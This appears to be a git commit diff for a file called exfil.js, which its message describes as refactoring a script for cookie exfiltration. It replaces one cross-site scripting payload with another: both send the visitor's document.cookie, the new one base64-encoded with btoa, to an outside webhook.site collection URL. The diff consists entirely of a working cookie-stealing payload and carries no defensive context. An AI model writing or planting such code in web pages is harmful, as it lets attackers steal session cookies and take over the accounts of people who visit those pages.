bb969151561ccbd337cc6416db0fd138658a6093
Luizxz <118949863+Liuz94@users.noreply.github.com>
2026-07-26 22:00:43 -0500

    Refactor script to use btoa for cookie exfiltration

--- exfil.js
+++ exfil.js
@@ -1,1 +1,1 @@
-<script>new Image().src="https://webhook.site/bece384c-6c1c-4e4f-88c3-b2904037892e?c="+document.cookie;</script>
+x = new Image(); x.src = 'https://webhook.site/bece384c-6c1c-4e4f-88c3-b2904037892e?data='+btoa(document.cookie);
